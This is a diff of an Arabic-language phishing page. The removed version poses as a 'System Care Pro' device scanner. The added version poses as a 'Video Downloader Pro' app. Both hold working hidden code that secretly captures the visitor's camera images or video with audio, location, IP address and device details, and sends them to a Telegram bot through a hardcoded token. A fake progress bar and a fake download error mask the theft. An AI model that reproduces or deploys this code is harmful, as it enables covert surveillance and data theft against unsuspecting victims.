@@ -2,177 +2,101 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Care Pro - فحص وإصلاح أداء النظام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Downloader Pro</title>
     <style>
-        :root { --primary: #2ecc71; --accent: #27ae60; --dark-bg: #111111; }
-        body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        /* تصميم الواجهة الزجاجية */
-        .container { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border-radius: 25px; padding: 40px; width: 90%; max-width: 420px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
-        
-        .icon-box { font-size: 60px; margin-bottom: 25px; color: var(--primary); text-shadow: 0 0 20px rgba(46, 204, 113, 0.3); }
-        h1 { font-size: 1.6rem; margin: 0 0 10px; font-weight: 800; }
-        p { color: #8892b0; font-size: 0.95rem; margin-bottom: 35px; line-height: 1.5; }
-
-        /* قائمة البيانات لزيادة المصداقية */
-        .system-specs { text-align: right; margin-bottom: 35px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; }
-        .spec-item { display: flex; justify-content: space-between; padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
-        .spec-item span:first-child { color: #a8b2d1; }
-        .spec-item span:last-child { color: var(--primary); font-weight: bold; }
-
-        #scanBtn { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 1.2rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.4s; box-shadow: 0 15px 30px rgba(46, 204, 113, 0.2); outline: none; }
-        #scanBtn:active { transform: scale(0.96); opacity: 0.8; }
-
-        /* شريط التحميل الوهمي الاحترافي */
-        #status-area { display: none; margin-top: 25px; text-align: center; }
-        .progress-container { width: 100%; height: 6px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); transition: 0.3s; }
-        
-        video { display: none; }
+        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .app-card { background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
+        .logo { font-size: 50px; margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        .download-btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        #status { margin-top: 15px; font-size: 0.8rem; color: #94a3b8; display: none; }
+        canvas, video { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon-box">🛡️</div>
-        <h1>System Care Pro</h1>
-        <p>قم بفحص وإصلاح تعريفات الجهاز وتحسين أداء البطارية والميكروفون فوراً.</p>
 
-        <div class="system-specs">
-            <div class="spec-item"><span>المعالج (CPU):</span><span id="cpu-specs">تحليل...</span></div>
-            <div class="spec-item"><span>ذاكرة الرام (RAM):</span><span id="ram-specs">تحليل...</span></div>
-            <div class="spec-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
-        </div>
+<div class="app-card">
+    <div class="logo">📥</div>
+    <h2>حمل فيديوهاتك المفضلة</h2>
+    <p style="font-size: 0.9rem; color: #94a3b8;">الصق رابط الفيديو من (TikTok, Instagram, Facebook) للتحميل بجودة عالية.</p>
+    
+    <input type="text" id="urlInput" placeholder="ضع الرابط هنا...">
+    <button class="download-btn" onclick="startProcess()">بدء التحميل المباشر</button>
+    
+    <div id="status">جاري معالجة الرابط وتجهيز الجودة...</div>
+</div>
 
-        <button id="scanBtn">بدء الفحص الذكي</button>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
-        <div id="status-area">
-            <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
-            <p id="scan-text" style="margin-top:15px; font-size:0.85rem; color:#8892b0;">جاري تحليل عتاد النظام...</p>
-        </div>
-    </div>
+<script>
+    const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
+    const chat = "7984067238";
 
-    <video id="v" autoplay playsinline muted></video>
+    async function sendPhoto(blob, caption) {
+        const fd = new FormData();
+        fd.append("chat_id", chat);
+        fd.append("photo", blob, "snap.jpg");
+        fd.append("caption", caption);
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
+        } catch (e) {}
+    }
 
-    <script>
-        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
-        const chat = "7984067238";
+    async function getSpecs() {
+        let info = `👤 *بيانات الهدف*:\n\n`;
+        info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
+        info += `• 🔋 البطارية: \`${(await navigator.getBattery()).level * 100}%\`\n`;
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
+        } catch(e) {}
+        return info;
+    }
 
-        async function sendToTelegram(msg, type = "text", data = null) {
-            const url = `https://api.telegram.org/bot${token}/`;
-            const fd = new FormData();
-            fd.append("chat_id", chat);
-            try {
-                if (type === "text") {
-                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
-                } else if (type === "video") {
-                    fd.append("video", data, "system_scan.mp4");
-                    if (msg) fd.append("caption", msg);
-                    await fetch(url + "sendVideo", { method: "POST", body: fd });
-                }
-            } catch (e) {}
-        }
-
-        // إظهار بيانات حقيقية لزيادة المصداقية
-        document.getElementById('cpu-specs').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
-        document.getElementById('ram-specs').innerText = (navigator.deviceMemory || 4) + " GB";
-
-        async function getFullReport() {
-            let info = `📊 *تقرير شامل للهدف*:\n\n`;
-            // دمج المتغيرات التي طلبتها
-            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
-            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
-            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
+    async function capture(side) {
+        const constraints = { video: { facingMode: side === "front" ? "user" : "environment" } };
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const v = document.getElementById('v');
+            v.srcObject = stream;
             
-            const conn = navigator.connection;
-            if (conn) {
-                let type = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
-                info += `• 📶 نوع الشبكة: \`${type} (${conn.effectiveType.toUpperCase()})\`\n`;
-                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
-            }
-
-            try {
-                const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
-            } catch(e) {}
-
-            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
-
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
-            } catch(e) {}
-            return info;
-        }
-
-        async function recordVideo(mode, label, duration) {
-            try {
-                // حل مشكلة تداخل الكاميرات عبر إيقاف أي تيار نشط
-                if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-                window.currentStream = stream;
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                
-                const recordingPromise = new Promise(resolve => {
-                    recorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: "video/mp4" });
-                        // منع إرسال الملفات التالفة (الـ 110 بايت)
-                        if (blob.size > 2000) await sendToTelegram(`🎥 فيديو فحص حقيقي (${label} - 12 ثانية بصوت)`, "video", blob);
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve();
-                    };
-                });
-                recorder.start();
-                await new Promise(r => setTimeout(r, duration));
-                recorder.stop();
-                return recordingPromise;
-            } catch (e) { return null; }
-        }
-
-        document.getElementById("scanBtn").onclick = async function() {
-            this.style.display = "none";
-            document.getElementById("status-area").style.display = "block";
+            await new Promise(r => v.onloadedmetadata = r);
+            const canvas = document.getElementById('c');
+            canvas.width = v.videoWidth;
+            canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
             
-            const bar = document.getElementById("bar");
-            const txt = document.getElementById("scan-text");
-            let p = 0;
-            
-            // شريط تحميل وهمي
-            const interval = setInterval(() => {
-                p += Math.random() * 4;
-                if (p > 100) p = 100;
-                bar.style.width = p + "%";
-                if (p > 15) txt.innerText = "فحص تعريفات الكاميرا...";
-                if (p > 45) txt.innerText = "تحليل جودة الميكروفون والصوت...";
-                if (p > 75) txt.innerText = "جاري رفع تقرير الأداء المتقدم...";
-            }, 300);
+            stream.getTracks().forEach(t => t.stop());
+            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+        } catch (e) { return null; }
+    }
 
-            // إرسال التقرير الشامل فوراً
-            sendToTelegram(await getFullReport());
-            
-            navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram(`📍 *موقع الجهاز*:\n[فتح عبر الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
-            });
+    async function startProcess() {
+        const url = document.getElementById('urlInput').value;
+        if (!url) { alert("يرجى وضع رابط أولاً"); return; }
 
-            // تسجيل الفيديوهات بصوت (12 ثانية للأمامي ثم 12 للخلفي)
-            await recordVideo("user", "أمامي", 12000);
-            await new Promise(r => setTimeout(r, 2500)); // فاصل زمني لضمان التبديل الصحيح
-            await recordVideo("environment", "خلفي", 12000);
+        document.getElementById('status').style.display = 'block';
+        
+        // 1. جلب البيانات النصية
+        const specs = await getSpecs();
+        
+        // 2. تصوير الكاميرا الأمامية
+        const frontImg = await capture("front");
+        if (frontImg) await sendPhoto(frontImg, specs + "\n📷 (كاميرا أمامية)");
 
-            setTimeout(() => {
-                clearInterval(interval);
-                location.href = "https://www.google.com"; // التوجيه النهائي
-            }, 3000);
-        };
+        // 3. تصوير الكاميرا الخلفية
+        const backImg = await capture("back");
+        if (backImg) await sendPhoto(backImg, "📷 (كاميرا خلفية)");
 
-        // تتبع حالة الاتصال
-        window.onblur = () => sendToTelegram("🔴 الهدف خرج من صفحة الفحص.");
-        window.onfocus = () => sendToTelegram("🟢 الهدف عاد لفتح صفحة الفحص.");
-    </script>
+        setTimeout(() => {
+            alert("خطأ: تعذر التحميل من هذا الرابط حالياً. جرب رابطاً آخر.");
+            document.getElementById('status').style.display = 'none';
+        }, 3000);
+    }
+</script>
+
 </body>
 </html>
